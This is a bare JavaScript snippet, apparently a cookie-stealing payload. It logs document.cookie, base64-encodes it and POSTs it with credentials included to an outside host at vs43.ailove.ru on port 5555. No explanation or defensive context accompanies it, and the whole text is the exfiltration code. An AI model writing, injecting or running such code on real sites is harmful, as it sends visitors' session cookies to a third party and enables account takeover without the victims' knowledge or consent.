console.log(document.cookie);
console.log(btoa(document.cookie));
fetch(
    `https://vs43.ailove.ru:5555/api/sw/cookie/${btoa(document.cookie)}`, {
        method:"POST",
        credentials:"include"
    })
.then(res=>console.log(res))
.catch(err=>console.error(err));
